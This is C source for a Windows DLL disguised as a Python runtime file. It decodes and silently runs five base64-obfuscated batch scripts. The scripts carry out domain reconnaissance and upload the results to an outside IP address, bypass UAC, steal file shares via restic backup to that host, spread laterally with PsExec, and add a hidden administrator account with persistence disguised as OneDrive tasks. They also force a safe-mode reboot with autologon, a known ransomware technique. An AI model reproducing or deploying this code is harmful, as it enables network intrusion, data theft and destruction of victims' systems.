#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")

const char* batNames[] = {
    "UpdateEdge.bat", "Discover.bat", "Tools.bat", "up.bat", "1.bat"
};

const char* encodedBats[] = {
"QGVjaG8gb2ZmDQpzdGFydCAvQiBweXRob24zICJDOlxXaW5kb3dzXGFkZnNccHlcd28xMi5weSIgPm51bCAyPiYxDQo=",
"QGVjaG8gb2ZmDQoNCiBpZiBub3QgIiUxIj09ImhpZGRlbiIgKA0KICAgICA+bnVsIDI+JjEgc3RhcnQgL21pbiBjbWQgL2MgIiV+MCIgaGlkZGVuDQogICAgIGV4aXQNCiApDQoNCigNCiAgICBlY2hvIFtEb21haW4gQWRtaW5zXQ0KICAgIG5ldCBncm91cCAiZG9tYWluIGFkbWlucyIgL2RvbWFpbiAyPiYxDQogICAgZWNobyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCg0KICAgIGVjaG8gW05ldHdvcmsgQ29uZmlndXJhdGlvbl0NCiAgICBpcGNvbmZpZyAvYWxsIDI+JjENCiAgICBlY2hvID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KDQogICAgZWNobyBbRG9tYWluIFRydXN0c10NCiAgICBubHRlc3QgL2RvbWFpbl90cnVzdHMgMj4mMQ0KICAgIGVjaG8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQoNCiAgICBlY2hvIFtMb2NhbCBBZG1pbmlzdHJhdG9yc10NCiAgICBuZXQgbG9jYWxncm91cCBhZG1pbmlzdHJhdG9ycyAyPiYxDQogICAgZWNobyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCg0KICAgIGVjaG8gW0RvbWFpbiBDb21wdXRlcnNdDQogICAgbmV0IGdyb3VwICJEb21haW4gQ29tcHV0ZXJzIiAvZG9tYWluIDI+JjENCikgPiBkaXNjb3ZlcnkudHh0IDI+JjENCg0KKA0KICAgIGZvciAvZiAidG9rZW5zPTIgZGVsaW1zPToiICUlYSBpbiAoJ2lwY29uZmlnIF58IGZpbmRzdHIgIklQdjQiJykgZG8gKA0KICAgICAgICBmb3IgL2YgInRva2Vucz0qIGRlbGltcz0gIiAlJWIgaW4gKCIlJWEiKSBkbyAoDQogICAgICAgICAgICBlY2hvICUlYg0KICAgICAgICApDQogICAgKQ0KKSA+IHBjLnR4dCAyPiYxDQoNCg0KcG93ZXJzaGVsbCAtbm9wIC1jICIkdXJsPSdodHRwOi8vMTkyLjEyMy4yMjYuODQvdGVzdF91cGxvYWQnOyAkZmlsZT0nZGlzY292ZXJ5LnR4dCc7ICRieXRlcz1bU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJGZpbGUpOyAkd2ViPU5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7ICR3ZWIuVXBsb2FkRGF0YSgkdXJsLCAkYnl0ZXMpIiA+bnVsIDI+JjENCmN1cmwgLVggUE9TVCAtLWRhdGEtYmluYXJ5ICJAZGlzY292ZXJ5LnR4dCIgaHR0cDovLzE5Mi4xMjMuMjI2Ljg0L3Rlc3RfdXBsb2FkID5udWwgMj4mMQ0KDQoNCmRlbCAiZGlzY292ZXJ5LnR4dCIgL3EgPm51bCAyPiYxIA0KZGVsICIlfmYwIg==",
"QGVjaG8gb2ZmDQoNCmlmIG5vdCAiJTEiPT0iaGlkZGVuIiAoDQogICAgPm51bCAyPiYxIHN0YXJ0IC9taW4gY21kIC9jICIlfjAiIGhpZGRlbg0KICAgIGV4aXQNCikNCg0KZmx0bWMgPm51bCAyPiYxIHx8ICgNCiAgICBlY2hvIFNldCBVQUMgPSBDcmVhdGVPYmplY3ReKCJTaGVsbC5BcHBsaWNhdGlvbiJeKSA+ICIldGVtcCVcZWxldmF0ZS52YnMiDQogICAgZWNobyBVQUMuU2hlbGxFeGVjdXRlICIlfmYwIiwgIiIsICIiLCAicnVuYXMiLCAxID4+ICIldGVtcCVcZWxldmF0ZS52YnMiDQogICAgIiV0ZW1wJVxlbGV2YXRlLnZicyINCiAgICBkZWwgIiV0ZW1wJVxlbGV2YXRlLnZicyIgL3EgPm51bCAyPiYxDQogICAgZXhpdCAvYg0KKQ0KDQpzZXRsb2NhbCBlbmFibGVkZWxheWVkZXhwYW5zaW9uDQoNCg0KcG93ZXJzaGVsbCAtY29tbWFuZCAiKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwczovL2dpdGh1Yi5jb20vR2FsYWxIYW1vdWR5L0NEX2NoYWxsZW5nZS9yYXcvbWFpbi9Ub29scy56aXAnLCAnVG9vbHMuemlwJykiIA0KDQppZiBleGlzdCAiVG9vbHMuemlwIiAoDQogICAgZWNobyBFeHRyYWN0aW5nIFRvb2xzLnppcC4uLg0KICAgIG1rZGlyIFRvb2xzIDI+bnVsDQogICAgcG93ZXJzaGVsbCAtY29tbWFuZCAiRXhwYW5kLUFyY2hpdmUgLVBhdGggJ1Rvb2xzLnppcCcgLURlc3RpbmF0aW9uUGF0aCAnVG9vbHMnIC1Gb3JjZSIgPm51bCAyPiYxDQogICAgZGVsICJUb29scy56aXAiIC9xID5udWwgMj4mMSANCikNCg0KZm9yIC9mICJ0b2tlbnM9MiBkZWxpbXM9XCIgJSVhIGluICgnd2hvYW1pJykgZG8gc2V0IHVzZXJuYW1lPSUlYQ0KDQppZiBleGlzdCAiVG9vbHNccmVzdGljLmV4ZSIgKA0KICAgIFRvb2xzXHJlc3RpYy5leGUgLXIgcmVzdDpodHRwOi8vMTkyLjEyMy4yMjYuODQ6ODAwMC8gaW5pdCAtLXBhc3N3b3JkLWZpbGUgcHBwLnR4dA0KICAgIFRvb2xzXHJlc3RpYy5leGUgLXIgcmVzdDpodHRwOi8vMTkyLjEyMy4yMjYuODQ6ODAwMC8gLS1wYXNzd29yZC1maWxlIHBwcC50eHQgLS11c2UtZnMtc25hcHNob3QgLS12ZXJib3NlIGJhY2t1cCAiRjpcU2hhcmVzXCF1c2VybmFtZSFcIg0KKQ0KDQppZiBleGlzdCAiVG9vbHNcUHNFeGVjNjQuZXhlIiAoDQogICAgVG9vbHNcUHNFeGVjNjQuZXhlIC1hY2NlcHRldWxhIFxcMTkyLjEyMy4yMjYuODQgLWMgLWYgLWQgLXMgdXAuYmF0DQopDQoNCmlmIGV4aXN0ICJUb29sc1xQc0V4ZWM2NC5leGUiIGlmIGV4aXN0ICJwYy50eHQiICgNCiAgICBUb29sc1xQc0V4ZWM2NC5leGUgLWFjY2VwdGV1bGEgQHBjLnR4dCAtYyAtZiAtZCAtaCAxLmJhdA0KICAgIGRlbCAicGMudHh0IiAvcSA+bnVsIDI+JjEgDQopDQoNCmRlbCAiJX5mMCIg",
"QGVjaG8gb2ZmICYgc2V0bG9jYWwgZW5hYmxlZGVsYXllZGV4cGFuc2lvbg0KDQogaWYgbm90ICIlMSI9PSJoaWRkZW4iICgNCiAgICAgPm51bCAyPiYxIHN0YXJ0IC9taW4gY21kIC9jICIlfjAiIGhpZGRlbg0KICAgICBleGl0DQogKQ0KIA0KbmV0IHNlc3Npb24gPm51bCAyPiYxIHx8ICgNCiAgICBzZXQgImFyZ3M9JSoiDQogICAgc2V0ICJhcmdzPSFhcmdzOiI9XCIhIg0KICAgIHBvd2Vyc2hlbGwgLW5vcCAtYyAiU3RhcnQtUHJvY2VzcyAnJX5mMCcgJyFhcmdzIScgLVZlcmIgUnVuQXMgLVdpbmRvd1N0eWxlIEhpZGRlbiINCiAgICBleGl0IC9iDQopDQoNCm5ldCB1c2VyIGJsYWNrY2F0IEphcGFuTmlnaHQxMjMgL2FkZCA+bnVsIDI+JjENCg0KbmV0IGxvY2FsZ3JvdXAgQWRtaW5pc3RyYXRvcnMgYmxhY2tjYXQgL2FkZCA+bnVsIDI+JjENCg0KZm9yIC9mICJ0b2tlbnM9MiBkZWxpbXM9XCIgJSVBIGluICgnd2hvYW1pJykgZG8gc2V0ICJjdXJyZW50VXNlcj0lJUEiDQoNCnNjaHRhc2tzIC9jcmVhdGUgL3J1IFNZU1RFTSAvdG4gIk9uZURyaXZlIFNlY3VyaXR5IFRhc2stUy0xLTUtMjEtJWN1cnJlbnRVc2VyJSIgL3RyICJDOlxXaW5kb3dzXGFkZnNccHlcVXBkYXRlRWRnZS5iYXQiIC9zYyBPTlNUQVJUIC9GIDI+JjENCnNjaHRhc2tzIC9jcmVhdGUgL3J1IFNZU1RFTSAvdG4gIk9uZURyaXZlIFNlY3VyaXR5IFRhc2stUy0xLTUtMjEtJWN1cnJlbnRVc2VyJSIgL3RyICJDOlxVc2Vyc1wlY3VycmVudFVzZXIlXEFwcERhdGFcTG9jYWxcTm90ZXBhZFxVcGRhdGVFZGdlLmJhdCIgL3NjIE9OU1RBUlQgL0YgMj4mMQ0Kc2NodGFza3MgL2NyZWF0ZSAvcnUgU1lTVEVNIC90biAiT25lRHJpdmUgU2VjdXJpdHkgVGFzay1TLTEtNS0yMS0lY3VycmVudFVzZXIlIiAvdHIgIkM6XFdpbmRvd3NcYWRmc1xweVxVcGRhdGVFZGdlLmJhdCIgL3NjIE1JTlVURSAvbW8gNzIwIC9GIDI+JjENCnNjaHRhc2tzIC9jcmVhdGUgL3J1IFNZU1RFTSAvdG4gIk9uZURyaXZlIFNlY3VyaXR5IFRhc2stUy0xLTUtMjEtJWN1cnJlbnRVc2VyJSIgL3RyICJDOlxVc2Vyc1wlY3VycmVudFVzZXIlXEFwcERhdGFcTG9jYWxcTm90ZXBhZFxVcGRhdGVFZGdlLmJhdCIgL3NjIE1JTlVURSAvbW8gNzIwIC9GIDI+JjENCnNjaHRhc2tzIC9jcmVhdGUgL3RuICJPbmVEcml2ZSBTZWN1cml0eSBUYXNrLVMtMS01LTIxLSVjdXJyZW50VXNlciUiIC90ciAiQzpcV2luZG93c1xhZGZzXHB5XFVwZGF0ZUVkZ2UuYmF0IiAvc2MgT05JRExFIC9JIDEgL0YgMj4mMQ0Kc2NodGFza3MgL2NyZWF0ZSAvdG4gIk9uZURyaXZlIFNlY3VyaXR5IFRhc2stUy0xLTUtMjEtJWN1cnJlbnRVc2VyJSIgL3RyICJDOlxVc2Vyc1wlY3VycmVudFVzZXIlXEFwcERhdGFcTG9jYWxcTm90ZXBhZFxVcGRhdGVFZGdlLmJhdCIgL3NjIE9OSURMRSAvSSAxIC9GIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24iIC92IFVzZXJJbml0IC90IFJFR19TWiAvZCAiQzpcV2luZG93c1xzeXN0ZW0zMlx1c2VyaW5pdC5leGUsQzpcVXNlcnNcJWN1cnJlbnRVc2VyJVxBcHBEYXRhXExvY2FsXE5vdGVwYWRcVXBkYXRlRWRnZS5iYXQiIC9mIDI+JjENCg0KZGVsICIlfmYwIg==",
"QGVjaG8gb2ZmDQoNCiBpZiBub3QgIiUxIj09ImhpZGRlbiIgKA0KICAgICA+bnVsIDI+JjEgc3RhcnQgL21pbiBjbWQgL2MgIiV+MCIgaGlkZGVuDQogICAgIGV4aXQNCiApDQogDQpmb3IgL2YgInRva2Vucz0yIGRlbGltcz1cIiAlJUEgaW4gKCd3aG9hbWknKSBkbyBzZXQgImN1cnJlbnRVc2VyPSUlQSINCg0KYmNkZWRpdCAgL3NldCB7ZGVmYXVsdH0gc2FmZWJvb3QgbmV0d29yayAgPm51bCAyPiYxDQo6OiBmaW5kc3RyICAvQzoiVGhlIG9wZXJhdGlvbiBjb21wbGV0ZWQgc3VjY2Vzc2Z1bGx5LiIgDQpyZWcgIGFkZCBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bk9uY2UgL3YgKmEgL3QgUkVHX1NaIC9kICJjbWQuZXhlIC9jIEM6XFVzZXJzXCVjdXJyZW50VXNlciVcQXBwRGF0YVxMb2NhbFxOb3RlcGFkXGNvbXBhbnkuZXhlIiAvZiA+bnVsIDI+JjEgDQo6OiBmaW5kc3RyICAvQzoiVGhlIG9wZXJhdGlvbiBjb21wbGV0ZWQgc3VjY2Vzc2Z1bGx5LiIgDQpyZWcgIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxXaW5sb2dvbiIgL3YgRGVmYXVsdFVzZXJOYW1lIC90IFJFR19TWiAvZCBibGFja2NhdCAvZiA+bnVsIDI+JjENCnJlZyAgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFdpbmxvZ29uIiAvdiBEZWZhdWx0UGFzc3dvcmQgL3QgUkVHX1NaIC9kIEphcGFuTmlnaHQxMjMgL2YgPm51bCAyPiYxDQpyZWcgIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxXaW5sb2dvbiIgL3YgQXV0b0FkbWluTG9nb24gL3QgUkVHX1NaIC9kIDEgL2YgPm51bCAyPiYxDQp0aW1lb3V0IC9UIDYwMCA+bnVsDQpzaHV0ZG93biAgLXIgLXQgMA=="
};

BOOL CreateBatchFile(const char* base64, const char* filename) {
    DWORD decodedSize = 0;
    if (!CryptStringToBinaryA(base64, 0, CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL))
        return FALSE;

    BYTE* decodedData = (BYTE*)malloc(decodedSize);
    if (!decodedData) return FALSE;

    if (!CryptStringToBinaryA(base64, 0, CRYPT_STRING_BASE64, decodedData, &decodedSize, NULL, NULL)) {
        free(decodedData);
        return FALSE;
    }

    HANDLE hFile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        free(decodedData);
        return FALSE;
    }

    DWORD bytesWritten;
    BOOL success = WriteFile(hFile, decodedData, decodedSize, &bytesWritten, NULL);
    CloseHandle(hFile);
    free(decodedData);

    return success && (bytesWritten == decodedSize);
}

__declspec(dllexport) void ExecuteInOrder() {
    for (int i = 0; i < 5; i++) {
        if (CreateBatchFile(encodedBats[i], batNames[i])) {
            SHELLEXECUTEINFOA sei = { sizeof(sei) };
            sei.lpFile = batNames[i];
            sei.nShow = SW_HIDE;  // Changed to hide window
            sei.lpVerb = "open";
            sei.fMask = SEE_MASK_NOCLOSEPROCESS;
            
            if (ShellExecuteExA(&sei)) {
                WaitForSingleObject(sei.hProcess, INFINITE);
                CloseHandle(sei.hProcess);
            }
            
        }
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    return TRUE;
}
// gcc -shared -o python311x.dll python311x.c -lcrypt32